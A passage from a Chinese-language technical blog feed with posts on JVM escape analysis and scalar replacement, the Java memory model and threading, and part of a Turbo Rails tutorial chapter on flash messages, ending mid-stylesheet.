    <url>//post/JVM/%E5%90%8E%E7%AB%AF%E7%BC%96%E8%AF%91%E4%B8%8E%E4%BC%98%E5%8C%96.html</url>
    <content><![CDATA[<h1 id="后端编译与优化"><a href="#后端编译与优化" class="headerlink" title="后端编译与优化"></a>后端编译与优化</h1><h2 id="编译器优化技术"><a href="#编译器优化技术" class="headerlink" title="编译器优化技术"></a>编译器优化技术</h2><h3 id="逃逸分析"><a href="#逃逸分析" class="headerlink" title="逃逸分析"></a>逃逸分析</h3><blockquote>
<p>逃逸分析本身不是直接进行优化的方法，而是一种为优化提供帮助的分析算法</p>
<p>逃逸分析的原理：</p>
<p>​        我们分析对象的动态作用域，如果对象创建在方法中，可能被外部方法所引用到，例如作为参数被外部方法进行调用，这叫做<code>方法逃逸</code>，</p>
<p>​        被外部线程所访问到，例如赋值给外部线程使用的变量中。称为<code>线程逃逸</code></p>
</blockquote>
<p>​        从不逃逸，方法逃逸，线程逃逸。称为对象从小到大的逃逸程度，我们因此也可以做不同的优化策略、</p>
<h4 id="栈上分配"><a href="#栈上分配" class="headerlink" title="栈上分配"></a>栈上分配</h4><p>​        大家都知道在java中，所有的对象都存储在堆空间中，随着存放 的对象越来越多，也就需要垃圾回收器来进行工作，而这一步也是非常消耗性能的，那这里就引出一个概念<code>栈上分配</code>，也就是当我们进行逃逸分析后，发现对象不存在<code>线程逃逸</code>，我们将对象存储在栈上，随着栈帧的插入与弹出，对象本身也跟着创建和销毁。</p>
<blockquote>
<p> 这里我们需要提醒两点：</p>
<ol>
<li><p>之前放在堆中，堆中对象是被各个线程共享的，只要有指针指向该对象的地址，就可以进行使用。但栈是线程独有的。所以栈上分配的第一点：<code>对象不会被线程共享，也叫做线程逃逸</code>。</p>
</li>
<li><p>如果对象被分配到栈上了，随着栈帧插入与弹出（也就是方法的调用与结束），变量会跟着创建和删除，那如果该变量被方法外所引用，比如被当做方法参数被其他方法进行调用。这也称为<code>方法逃逸</code></p>
</li>
</ol>
</blockquote>
<p>​        栈上分配支持：<code>方法逃逸</code>，不支持：<code>线程逃逸</code></p>
<h4 id="标量替换"><a href="#标量替换" class="headerlink" title="标量替换"></a>标量替换</h4><blockquote>
<p>这里的标量是指Java中基础变量，例如：<code>int,char,boolen,short,Refference</code>等，也就是变量不能再拆分为更小的元素，这就叫<code>标量</code>。</p>
<p>而当我们创建对象后，对象可以再被细分为各种标量的组合，该对象也叫做<code>聚合量</code></p>
</blockquote>
<p>​        面向过程编程的一个好处就是不用封装对象，效率更高，所以通过这一点，如果我们能分析出该对象只有一部分会被使用，且对象不会逃逸到方法体外，则我们不创建该对象，而是直接创建对象的标量，进行使用。下面我们来代码解释一下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> x<span class="token punctuation">;</span>
  <span class="token keyword">int</span> y<span class="token punctuation">;</span>
  <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">=</span> x<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">=</span> y<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> x<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//没有优化前</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> <span class="token constant">XX</span> <span class="token operator">=</span> x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token constant">XX</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> person<span class="token punctuation">.</span><span class="token function">getX</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//第一步：构造函数内联后的样子</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> <span class="token constant">XX</span> <span class="token operator">=</span> x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>
  <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token function">point_memory_alloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//堆中分配P对象</span>
  p<span class="token punctuation">.</span>x<span class="token operator">==</span><span class="token constant">XX</span><span class="token punctuation">;</span>													<span class="token comment">//Person构造函数内联后</span>
  p<span class="token punctuation">.</span>y<span class="token operator">==</span><span class="token number">42</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> p<span class="token punctuation">.</span>x<span class="token punctuation">;</span>												<span class="token comment">//Person::getX()被内联后</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//第二步：进行标量替换优化</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> <span class="token constant">XX</span> <span class="token operator">=</span> x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>
	<span class="token comment">//相当于我不创建一个完整对象了，我只创建几个标量来代替使用</span>
  <span class="token keyword">int</span> pX <span class="token operator">=</span> <span class="token constant">XX</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> py <span class="token operator">=</span> <span class="token number">42</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> pX<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//第三步：作无效代码消除后</span>
<span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> x<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        标量替换会更加严格一些：不允许方法逃狱。</p>
<h4 id="同步消除"><a href="#同步消除" class="headerlink" title="同步消除"></a>同步消除</h4><blockquote>
<p>同步消除是指Java中的锁的优化，也就是当我们分析出一个同步的方法，实际中不会被其他线程所争抢，那么久没有必要上锁了，相当于你去公共厕所，怕别人进来，你上把锁。走了再开锁，那如果是在你家，只有你一个人时，就没必要再加个锁吧，再懒点儿你门都可以不要了。</p>
</blockquote>
<p>​        当经过逃逸分析后，我们发现方法不会被其他线程访问使用，也就是线程逃逸，我们就可以不对线程进行同步操作。</p>
<h4 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4><p>​        从测试中我们发现效果不错，但实际中可能分析后消耗了性能还发现能被优化的很少。所以在<code>JDK 6 Update 23</code>之前是禁止该优化的，之后才开始默认开启逃逸分析。</p>
<ol>
<li><code>-XX:+DoEscapeAnalysis</code>手动开启逃逸分析</li>
<li><code>-XX:+PrintEscapeAnalysis</code>来查看开启后的分析结果</li>
<li><code>-XX:+EliminateAllocations</code>开启标量替换</li>
<li><code>-XX:+PrintEliminateAllocations</code>查看标量替换结果</li>
<li><code>-XX:+EliminateLocks</code>开启同步消除</li>
</ol>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
      <tags>
        <tag>逃逸分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Java内存模型与线程</title>
    <url>//post/JVM/12_Java%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B.html</url>
    <content><![CDATA[<h1 id="Java内存模型与线程"><a href="#Java内存模型与线程" class="headerlink" title="Java内存模型与线程"></a>Java内存模型与线程</h1><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8zz0ocjxkj30lc08u3za.jpg" alt="image-20221211165341244"></p>
<p>​        上面的图就是<code>线程，工作内存，主内存</code>的关系，也可以看到线程想要获取数据，需要先到工作内存找，工作内存从主内存中找，那为啥需要这个工作内存 ? 而不直接访问主内存，也可以避免数据不一致的情况了。</p>
<p>​        这就需要我们对物理计算机中如何并发访问有一点儿了解，我们知道CPU内含有寄存器，但寄存器能存放的内容太少，而大部分时间都要从内存中获取，如果等待从内存中取得数据，CPU又被浪费了，因为两者间的速度差太多，所以引入了高速缓存。</p>
<p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8zz90yl99j30kg087dgj.jpg" alt="image-20221211170142836"></p>
<p>​        除了增加高速缓存外，为了处理器内部的运输单元能被充分利用，处理器会对输入代码进行乱序执行，在计算后将乱序执行的结果重组，保证该结果与顺序执行的结果一致。而潜在的风险就是一个计算任务依赖另一个计算任务的中间结果，其顺序性不能靠代码的先后顺序来保证，而Java内存模型也保留了这一点，我们也可以看到上面两幅图结构是非常相似的。所以Java内存模型的定义也是由硬件决定的。</p>
<h2 id="内存间交互操作"><a href="#内存间交互操作" class="headerlink" title="内存间交互操作"></a>内存间交互操作</h2><p>​        也就是图1中，<code>线程，工作内存，主内存</code>数据是怎么交互的，Java内存模型定义了8个操作，每个操作都是原子性的，对double，long类型的变量来说，<code>load,store,read,write</code>有一定例外，分为两次32位操作，问题不大。</p>
<p><strong>锁定（lock）</strong>: 作用于主内存中的变量，将他标记为一个线程独享变量。</p>
<p><strong>解锁（unlock）</strong>: 作用于主内存中的变量，解除变量的锁定状态，被解除锁定状态的变量才能被其他线程锁定。</p>
<p><strong>read（读取）</strong>：作用于主内存的变量，它把一个变量的值从主内存传输到线程的工作内存中，以便随后的 load 动作使用。</p>
<p>**load(载入)**：把 read 操作从主内存中得到的变量值放入工作内存的变量的副本中。</p>
<p>**use(使用)**：把工作内存中的一个变量的值传给执行引擎，每当虚拟机遇到一个使用到变量的指令时都会使用该指令。</p>
<p><strong>assign（赋值）</strong>：作用于工作内存的变量，它把一个从执行引擎接收到的值赋给工作内存的变量，每当虚拟机遇到一个给变量赋值的字节码指令时执行这个操作。</p>
<p><strong>store（存储）</strong>：作用于工作内存的变量，它把工作内存中一个变量的值传送到主内存中，以便随后的 write 操作使用。</p>
<p><strong>write（写入）</strong>：作用于主内存的变量，它把 store 操作从工作内存中得到的变量的值放入主内存的变量中。</p>
<blockquote>
<p>其中，<code>read,load</code> 和 <code>store,write</code>都要求顺序执行，但中间可以插入其他操作。</p>
</blockquote>
<p>​        Java中还规定了这8种操作必须满足的规则（这里我通俗说）</p>
<ol>
<li><code>read,load</code> 和 <code>store,write</code> 不能单独出现，我要了必须用，我给了你必须收。</li>
<li>工作内存中修改了，必须同步到主内存</li>
<li>如果工作内存没修改，不允许同步主内存</li>
<li>一个新变量只能在主内存中诞生</li>
<li>一个变量同一时刻只能被一个线程<code>lock</code>,如果统一线程多次加锁后，必须多次释放锁。 排他，可重入</li>
<li>一个变量Lock后，会清空工作内存，之后使用需要重新获取加载。</li>
<li>不能先unlock 再lock，也不允许unlock 别的线程加的锁</li>
<li>执行unlock前，先将此变量的值同步回主内存</li>
</ol>
<hr>
<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p>三大特性：</p>
<ol>
<li>可见性（一个线程修改后，其他线程都能获取到新值）底层每次使用前都会刷新该变量值。</li>
<li>禁止指令重排优化，我用代码距离：</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Map</span> configOptions<span class="token punctuation">;</span>
<span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> configText<span class="token punctuation">;</span>
<span class="token keyword">volatile</span> <span class="token keyword">boolean</span> initialized <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

<span class="token comment">// 线程A中执行 读取配置文件进行初始化</span>
configOptions <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
configText <span class="token operator">=</span> <span class="token function">readConfigFile</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
initialized <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>

<span class="token comment">// 线程B中执行 等待初始化好后，利用配置干活儿</span>
<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>initialized<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">dosomethingWithConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​        如果上面<code>initialized</code> 没用volatile修改，<code>initialized = true;</code>就可能排到上面，导致B线程以为初始化好后进行操作，导致问题。这些问题十分隐蔽，因为代码的执行顺序可能与代码编写的顺序不同。</p>
<blockquote>
<p>这里我看有的资料说Volatile具有原子性，但我自己代码验证无法保证，因为Java运算操作符无原子性。Volatile是满足先行发生原则，具体看下面：</p>
</blockquote>
<h2 id="先行发生原则"><a href="#先行发生原则" class="headerlink" title="先行发生原则"></a>先行发生原则</h2><p>​        负责判断数据是否存在竞争，线程是否安全的有效手段，如果两个操作之间关系不匹配这些规则，则可能被指令重拍</p>
<h3 id="程序次序规则"><a href="#程序次序规则" class="headerlink" title="程序次序规则"></a>程序次序规则</h3><p>​        在一个线程中，按照<strong>控制流</strong>顺序，书写在其那面的操作先行发生与书写在后面的操作。注意：控制流不是代码顺序</p>
<p>Java 提供了三种类型的控制流语句。</p>
<ol>
<li>决策声明<ul>
<li>if 语句</li>
<li>切换语句</li>
</ul>
</li>
<li>循环语句<ul>
<li>做while循环</li>
<li>while 循环</li>
<li>for 循环</li>
<li>for-each 循环</li>
</ul>
</li>
<li>跳转语句<ul>
<li>中断语句</li>
<li>继续声明</li>
</ul>
</li>
</ol>
<h3 id="管程锁定规则"><a href="#管程锁定规则" class="headerlink" title="管程锁定规则"></a>管程锁定规则</h3><p>​        同一个锁，unlock 先行于 lock操作，这里先行指的时间上的先后</p>
<h3 id="Volatile变量规则"><a href="#Volatile变量规则" class="headerlink" title="Volatile变量规则"></a>Volatile变量规则</h3><p>​        对Volatile变量的写操作先行发生于后面对这个变量的读操作，这里的先后指时间上的先后</p>
<h3 id="线程启动规则"><a href="#线程启动规则" class="headerlink" title="线程启动规则"></a>线程启动规则</h3><p>​        Thread的start() 先行于此线程的每个动作</p>
<h3 id="线程终止规则"><a href="#线程终止规则" class="headerlink" title="线程终止规则"></a>线程终止规则</h3><p>​        Thread所有操作都先行发生于对此线程的终止检查</p>
<h3 id="线程中断规则"><a href="#线程中断规则" class="headerlink" title="线程中断规则"></a>线程中断规则</h3><p>​        <code>Thread::interrupt() </code>先行发生与对此线程的中断检查 <code>Thread::interrupted()</code></p>
<h3 id="对象终止规则"><a href="#对象终止规则" class="headerlink" title="对象终止规则"></a>对象终止规则</h3><p>​        一个对象的初始化完成先于<code>finalized()</code>方法的开始</p>
<h3 id="传递性"><a href="#传递性" class="headerlink" title="传递性"></a>传递性</h3><p>​        操作A先行于操作B，操作B先与操作C，则操作A先于操作B</p>
<p>这里也举个重要的例子：简单的变量get，set方法</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> value <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> value<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>假设现在有线程A，B，线程A先执行（时间上）了<code>setValue(1)</code>,线程B后执行了<code>getValue()</code>,问线程B获取到的返回值是多少？</p>
</blockquote>
<p>这道题很坑，常理来想，时间上先发生的操作肯定比后发生的操作先执行。但实际上：</p>
<p>​        时间先后顺序与先行发生原则之间基本没有因果关系，我们衡量并发安全问题的时候不要受到时间顺序的干扰，一切必须以先行发生原则为准。 时间上的先后，代码上的先后 都不能决定是否并发安全。</p>
<hr>
<h2 id="Java与线程"><a href="#Java与线程" class="headerlink" title="Java与线程"></a>Java与线程</h2><p>​        实现线程主要有三种方式，使用内核线程实现（1:1），使用用户线程实现（1:N），使用用户线程+轻量级进程混合实现（N:M）</p>
<h3 id="内核线程实现"><a href="#内核线程实现" class="headerlink" title="内核线程实现"></a>内核线程实现</h3><p>​        直接由操作系统内核支持的线程，线程的切换也由内核管理，程序一般不会直接使用内核线程，而是使用内核线程的一种高级接口——轻量级进程，也就是传统意义线程，每个轻量级进程都由一个内核线程支持，一比一的关系。</p>
<p>优点：每个轻量级进程都是独立的调度单元，一个阻塞了，不影响整个进程继续工作</p>
<p>缺点：基于内核线程实现，各类操作需要频繁在 <code>用户态 与 内核态</code>间切换。且一个系统支持的轻量级进程是有限的</p>
<h3 id="用户线程实现"><a href="#用户线程实现" class="headerlink" title="用户线程实现"></a>用户线程实现</h3><p>​        狭义的用户线程指：完全建立在用户空间的线程库上，系统内核无法感知，线程的建立，同步，销毁和调度完全在用户态中完成，可以不切换到内核态，速度很快。 部分高性能的数据库多线程就是由用户线程实现的。</p>
<p>缺点：也是由于没有系统内核的支持，所有系统操作都要由用户程序自己处理，Java，Ruby曾使用，后面也不用了，不过Go语言支持用户线程，作为高并发。</p>
<h3 id="混合使用"><a href="#混合使用" class="headerlink" title="混合使用"></a>混合使用</h3><p>​        既存在用户线程，也存在轻量级进程。用户线程还是在用户态，轻量级进程作为内核线程与用户线程之间的桥梁。</p>
<h3 id="Java线程的实现"><a href="#Java线程的实现" class="headerlink" title="Java线程的实现"></a>Java线程的实现</h3><p>​        HotSpot为例，它的每个Java线程都是直接映射到一个操作系统原生线程实现的，也就是上面的轻量级进程。线程的调度全权交给操作系统。</p>
<h3 id="Java线程调度"><a href="#Java线程调度" class="headerlink" title="Java线程调度"></a>Java线程调度</h3><p>​        线程调度分为：协同式 和 抢占式</p>
<ol>
<li>协同式：线程执行时间由线程本身来控制。线程把自己工作干完了，主动通知系统切换到另一个线程。Lua使用</li>
<li>抢占式：每个线程由操作系统来分配执行时间。Java使用</li>
</ol>
<p>​        协同式的好处是实现简单，但如果一个线程卡死会导致程序一直阻塞。如果使用抢占式，可以保证线程的执行时间片到时间了，就切换到其他线程了，比方说我们用IDEA写代码，如果卡死了，我们可以启动任务管理器来Kill这个卡死线程。</p>
<h3 id="状态转化"><a href="#状态转化" class="headerlink" title="状态转化"></a>状态转化</h3><p>​        线程状态。线程可以处于以下状态之一：</p>
<ul>
<li><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html#NEW"><code>NEW</code></a><br>尚未启动的线程处于此状态。</li>
<li><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html#RUNNABLE"><code>RUNNABLE</code></a><br>在 Java 虚拟机中执行的线程处于这种状态。</li>
<li><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html#BLOCKED"><code>BLOCKED</code></a><br>阻塞等待监视器锁的线程处于此状态。</li>
<li><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html#WAITING"><code>WAITING</code></a><br>无限期等待另一个线程执行特定操作的线程处于此状态。</li>
<li><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html#TIMED_WAITING"><code>TIMED_WAITING</code></a><br>等待另一个线程执行某个操作达指定等待时间的线程处于此状态。</li>
<li><a href="https://docs.oracle.com/javase/9/docs/api/java/lang/Thread.State.html#TERMINATED"><code>TERMINATED</code></a><br>已退出的线程处于此状态。</li>
</ul>
]]></content>
      <categories>
        <category>JVM</category>
      </categories>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第七章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E4%B8%83%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h1 id="Flash-messages-with-Hotwire"><a href="#Flash-messages-with-Hotwire" class="headerlink" title="Flash messages with Hotwire"></a>Flash messages with Hotwire</h1><p>​    本章节，我们将学习如何添加 flash messages 通过Turbo，并且如何通过Stimulus做出好看的动画效果。</p>
<h2 id="Adding-flash-messages-to-our-CRUD-controller"><a href="#Adding-flash-messages-to-our-CRUD-controller" class="headerlink" title="Adding flash messages to our CRUD controller"></a>Adding flash messages to our CRUD controller</h2><p>现在我们<code>Quote</code>模型的增删改查已经正常运转了，现在我们想添加<code>flash message</code>去提高系统的可用性。</p>
<p>在使用Turbo增加flash message之前，我们需要先来用不使用Turbo的版本，也就是Rails7之前的方式，而为了做到这一点，我们需要禁用Turbo在整个项目中。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// app/javascript/application.js</span>

<span class="token keyword">import</span> <span class="token string">"./controllers"</span>

<span class="token comment">// The two following lines disable Turbo on the whole application</span>
<span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Turbo <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"@hotwired/turbo-rails"</span>
Turbo<span class="token punctuation">.</span>session<span class="token punctuation">.</span>drive <span class="token operator">=</span> <span class="token boolean">false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样我们就禁用了Turbo，你可以在浏览器中测试一下，看一下这次是不是就变成跳转页面了。</p>
<p>其实我们在第一章时就使用了flash messages当<code>#create #update #destory</code>成功时，通过<code>notice</code>选项</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">QuotesController</span> <span class="token operator">&lt;</span> ApplicationController
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>build<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
      respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
        format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span> <span class="token punctuation">&#125;</span>
        format<span class="token punctuation">.</span>turbo_stream
      <span class="token keyword">end</span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:new</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">update</span></span>
    <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>
      redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully updated."</span></span>
    <span class="token keyword">else</span>
      render <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">status</span><span class="token operator">:</span> <span class="token symbol">:unprocessable_entity</span>
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">destroy</span></span>
    <span class="token variable">@quote</span><span class="token punctuation">.</span>destroy

    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully destroyed."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p><strong>注意</strong>：如果你不熟悉<code>notice</code>标记去使用flash messages，那么下面两行语法是一致的</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># Syntax 1</span>
redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span>

<span class="token comment"># Syntax 2</span>
flash<span class="token punctuation">[</span><span class="token symbol">:notice</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span>
redirect_to quotes_path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>我们会先展示不使用Turbo的flash messages，并抽离出一个局部页面partial</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/layouts/_flash.html.erb %></span>

<span class="token operator">&lt;</span><span class="token operator">%</span> flash<span class="token punctuation">.</span><span class="token keyword">each</span> <span class="token keyword">do</span> <span class="token operator">|</span>flash_type<span class="token punctuation">,</span> message<span class="token operator">|</span> <span class="token string-literal"><span class="token string">%>
  &lt;div class="flash__message"></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> message <span class="token string-literal"><span class="token string">%>
  &lt;/div></span></span>
<span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">end</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们将在每个页面中都渲染这个包含flash message的局部页面。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">></span>
<span class="token operator">&lt;</span>html<span class="token operator">></span>
  <span class="token operator">&lt;</span>head<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">-</span><span class="token operator">-</span> All the head code <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">></span>

  <span class="token operator">&lt;</span>body<span class="token operator">></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"layouts/navbar"</span></span> <span class="token string-literal"><span class="token string">%>

    &lt;div class="flash"></span></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> render <span class="token string-literal"><span class="token string">"layouts/flash"</span></span> <span class="token string-literal"><span class="token string">%>
    &lt;/div></span></span>

    <span class="token operator">&lt;</span><span class="token operator">%=</span> <span class="token keyword">yield</span> <span class="token string-literal"><span class="token string">%>
  &lt;/body></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们可以在浏览器中试试效果，增，删，改 都可以正常显示，我们再加一点儿css让它看起来更好看</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">// app/assets/stylesheets/components/_flash.scss

.flash</span> <span class="token punctuation">&#123;</span>
  <span class="token property">position</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>
  <span class="token property">top</span><span class="token punctuation">:</span> 5rem<span class="token punctuation">;</span>
  <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
